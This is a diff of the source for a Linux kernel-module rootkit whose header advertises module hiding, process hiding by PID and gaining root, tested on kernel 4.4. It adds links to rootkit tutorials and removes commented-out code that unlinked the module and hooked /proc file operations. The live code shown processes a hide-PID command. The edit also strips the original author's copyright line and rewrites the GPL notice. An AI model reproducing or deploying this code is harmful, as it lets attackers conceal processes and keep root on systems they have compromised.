@@ -1,19 +1,37 @@
 /*
- * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
+ *
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation; either version 2 of the License, or
- * (at your option) any later version.
+ * the Free Software Foundation; version >=2.
+ * 
+ *Maxim Biro <nurupo.contributions@gmail.com> is the main source for
+ * root access hacks @ https://github.com/nurupo/rootkit/ using memory, asm and system calls.
+ * 
+ * http://info.fs.tum.de/images/2/21/2011-01-19-kernel-hacking.pdf
+ 
+ * http://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/
+ * http://althing.cs.dartmouth.edu/local/LKM_HACKING.html
  *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
  *
- * You should have received a copy of the GNU General Public License along
- * with this program; if not, write to the Free Software Foundation, Inc.,
- * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+ Sample implementation: http://average-coder.blogspot.de/2011/12/linux-rootkit.html
+ * 
+ *    Module hiding:
+ *  http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html
+ *
+ *   Process hiding: 
+https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/
+ *
+ *The code provides the following functionalitles:
+ * automatic module hiding
+ * hide process with certain PID
+ * gain root access 
+ * 
+ * 
+ *All is tested on kernel 4.4.0-31
+ * 
+ *
+ 
  */
 
 #include <asm/unistd.h>
@@ -510,24 +528,6 @@ struct file_entry
 
 LIST_HEAD(file_list);
 
-// struct list_head *module_list;
-// int is_hidden = 0;
-
-// void hide(void)
-// {
-//     if (is_hidden) {
-//         return;
-//     }
-
-//     module_list = THIS_MODULE->list.prev;
-
-//     list_del(&THIS_MODULE->list);
-
-//     is_hidden = 1;
-// }
-
-// ========== END PROTECT ==========
-
 // ========== READDIR ==========
 
 struct file_operations *get_fop(const char *path)
@@ -710,30 +710,7 @@ int execute_command(const char __user *str, size_t length)
         str += sizeof(CFG_HIDE_PID);
         proc_to_hide = str;
         pr_info("Got hide pid command \n");
-        // int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
-        // original_write = asm_hook_unpatch(proc_fops_write);
-        // ssize_t ret = original_write(file, buf_user, count, p);
-        //str now points to the id of the process
-        // if (kern_path("/proc", 0, &p))
-        //     return 0;
-
-        // /* get the inode*/
-        // proc_inode = p.dentry->d_inode;
-
-        // /* get a copy of file_operations from inode */
-        // proc_fops = *proc_inode->i_fop;
-        // /* backup the file_operations */
-        // backup_proc_fops = proc_inode->i_fop;
-        // /* modify the copy with out evil function */
-        // proc_fops.iterate = iterate_modified;
-        // /* overwrite the active file_operations */
-        // proc_inode->i_fop = &proc_fops;
-
-        // undo changes
-        // proc_inode = p.dentry->d_inode;
-        // proc_inode->i_fop = backup_proc_fops;
-
-        //  asm_hook_patch(proc_fops_write);
+       
         pid_add(str);
         return 0;
     }
